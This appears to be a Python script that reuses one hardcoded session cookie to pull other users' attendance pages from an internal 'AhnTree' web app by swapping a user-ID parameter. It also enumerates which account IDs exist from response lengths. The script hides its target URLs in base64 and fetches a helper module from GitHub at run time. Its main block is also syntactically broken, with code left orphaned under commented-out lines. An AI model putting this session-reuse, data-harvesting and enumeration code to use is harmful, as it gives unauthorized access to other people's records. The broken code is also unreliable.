#-*-coding: utf-8-*-
import requests
import csv
import urllib
import sys
import os

def b64ff_module_check():
    sys.path.append("lib")

    try:
        import b64ff
        print("[+] b64ff.py import success.")
    except:
        print("[+] b64ff.py library downloding...")
        os.mkdir("lib")
        urllib.urlretrieve("https://raw.githubusercontent.com/ur0n2/b64ff/master/b64ff.py", "lib/b64ff.py")


def substitution_html(fname):
    with open("export_to_html\\" + fname, "r") as f :
      data = f.read()

    # Replace the target string
    newdata = data
    newdata = newdata.replace("<link rel=\"stylesheet\" type=\"text/css\" href=\"/AhnTree/css/common.css\"/>", "<link rel=\"stylesheet\" type=\"text/css\" href=\"../_FIles/common.css\"/>")
    newdata = newdata.replace("<link rel=\"shortcut icon\" href=\"/AhnTree/resource/leaf.ico\"/>", "<link rel=\"shortcut icon\" href=\"../_Files/leaf.ico\"/>")
    newdata = newdata.replace("<link rel=\"stylesheet\" type=\"text/css\" href=\"/AhnTree/css/kube.css\" />", "<link rel=\"stylesheet\" type=\"text/css\" href=\"../_FIles/kube.css\" />")
    newdata = newdata.replace("/AhnTree/resource/AhnLab_CI.png", "../_Files/AhnLab_CI.png")
    newdata = newdata.replace("<td><textarea name=\"comment\" cols=\"50\" rows=\"10\">", "<td><text name=\"comment\" cols=\"50\" rows=\"100\">")
    newdata = newdata.replace("<td><textarea readonly=\"readonly\" name=\"feedback\" cols=\"50\" rows=\"10\">", "<td><text readonly=\"readonly\" name=\"feedback\" cols=\"50\" rows=\"100\">")

    # Write the file out again
    with open("substitution_html\\save\\" + fname, "w") as f:
      f.write(newdata)


def convert_to_pdf(fname):
    print("[+] Do not recommended pdf module of python. Do used to another platform.")    
    pass


# letsgo function is login and export to html file.
def letsgo(sessionid, selectSTE, month, year, ordinal): 
    print("[+] Let's hack the pages.")
    #print(selectSTE, month, year, ordinal)

    #hack url example: http://10.2.102.150/AhnTree/attendance/set_page.jsp?selectSTE=jhlee.trainee&month=02&year=2017
    
    #url = "http://10.2.102.150/AhnTree/attendance/set_page.jsp"
    url = "aHR0cDovLzEwLjIuMTAyLjE1MC9BaG5UcmVlL2F0dGVuZGFuY2Uvc2V0X3BhZ2UuanNw" 
    url = b64ff.decode_base64(url)

    cookies = {'JSESSIONID':sessionid}
    payload = {'selectSTE':selectSTE, 'month':month, 'year':year} 

    r = requests.post(url, cookies = cookies, data = payload)

    if r.status_code == 500:
        print("[-] Status code is 500 Internal Error")
        #except list save
        with open("except_hack.csv", "a") as f: 
            data = str(selectSTE) + "," + str(ordinal)
            f.write(data)
            f.write('\n')
        return 

    elif r.status_code == 200:
        print("[-] Status code is 200 OK")
        pass 
    else: 
        print("[-] what is situation?")
        pass

    print("[-] Hacked the pages.")


    print("[+] Let's print the pages")
    fname = str(payload['selectSTE']) + "_" + str(payload['year']) + "_" + str(payload['month']) + ".html"
    f = open("export_to_html\\" + fname, "w") #
    f.write(r.content)
    f.close()
    print("[-] " + fname) #str(ordinal) +str(selectSTE) + str(year) + str(month)
    print("[-] Complete to print(the page.\n\n")

    print("[+] Let's substitution html")
    substitution_html(fname)

    print("[+] Let's convert html to pdf")
    convert_to_pdf(fname)


def id_overlap_check():
    #url = "http://10.2.102.150/AhnTree/member/idCheck.jsp?id="
    url = "aHR0cDovLzEwLjIuMTAyLjE1MC9BaG5UcmVlL21lbWJlci9pZENoZWNrLmpzcD9pZD0="
    url = b64ff.decode_base64(url)
    print("[+] Let's check the id.")

    with open("user_list.csv", "r") as f:
        reader = csv.reader(f, delimiter = ',')
        for row in reader:
            #print(row
            r = requests.get(url + row[0])
            if len(r.text) != 648: # != 648 # len(r.text) == 648 id exist, 635 is not exist
                print("[-] Is not exist ID: " + row[0])
                with open("not_exist_id.csv", "a") as f1:  
                    f1.write(row[0] + "," + row[1] + "\n")
            else:
                print("[-] ID is exist. PASS")
                with open("exist_id.csv", "a") as f1:  
                    f1.write(row[0] + "," + row[1] + "\n")


def id_verification():
    #url = "http://10.2.102.150/AhnTree/member/idCheck.jsp?id="
    url = "aHR0cDovLzEwLjIuMTAyLjE1MC9BaG5UcmVlL21lbWJlci9pZENoZWNrLmpzcD9pZD0="
    url = b64ff.decode_base64(url)
    print("[+] Let's check the id.")

    with open("pass_id.csv", "r") as f:
        reader = csv.reader(f, delimiter = ',')
        for row in reader:
            r = requests.get(url + row[0])
            if len(r.text) == 648: # != 648 # len(r.text) == 648 id exist, 635 is not exist
                print("[-] Pass the id verification: " + row[0])
            else:
                print("[-] ID is not exist. Fail" + row[0])



if __name__ == '__main__':
    b64ff_module_check()
    import b64ff
    #id_verification()  

    sessionid = "DCB97EC1F85AE98DE9510FAB6A05564C"
    #with open("pass_id.csv", "r") as f: # real
    #with open("test.csv", "r") as f: # jhlee.trainee,26
        reader = csv.reader(f, delimiter = ',')
        for row in reader:
            if row[1] =="23": #2015년 8월 ~ 2016년 2월
                print("[+] 23th")
                for x in xrange(7,14):
                    if (x%12)+1 < 3: #2016년 1월~2월
                        letsgo(sessionid, row[0], (x%12)+1, 2016, row[1])
                    else: #2015년 8~12월 
                        letsgo(sessionid, row[0], (x%12)+1, 2015, row[1])
            elif row[1] == "24": #2016년 2월 ~ 2016년 8월 
                print("[+] 24th")
                for x in xrange(2,9):
                    letsgo(sessionid, row[0], x, 2016, row[1])
            elif row[1] == "25": #2016년 8월 ~ 2017년 2월
                print("[+] 25th" )
                for x in xrange(7,14):
                    if (x%12)+1 < 3: #2017년 1월~2월 
                        letsgo(sessionid, row[0], (x%12)+1, 2017, row[1])
                    else: #2016년 8월~12월
                        letsgo(sessionid, row[0], (x%12)+1, 2016, row[1])
            elif row[1] == "26": #2017년 2월 ~ 2017년 8월
                print("[+] 26th")
                for x in xrange(2,6): #2017년 2월 ~ 2017년 5월
                    letsgo(sessionid, row[0], x, 2017, row[1])
                """
                for x in xrange(6,9):
                    letsgo(sessionid, row[0], x, 2017, row[1])
                
                for x in xrange(2,9)
                    letsgo(sessionid, row[0], x, 2017, row[1])
            elif row[1] == "overlap_pre_test": #for except list 201602~201708
                for x in xrange(2,13): #201602~201612
                    letsgo(sessionid, row[0], x, 2016, row[1])
                for x in xrange(1,6): #201701~201705
                    letsgo(sessionid, row[0], x, 2017, row[1])
                for x in xrange(6,9): #201706~201708
                    letsgo(sessionid, row[0], x, 2017, row[1])
                """
            else:
                print("")

    #test case
    #letsgo("DCB97EC1F85AE98DE9510FAB6A05564C", "jhlee.trainee", "04", "2017")
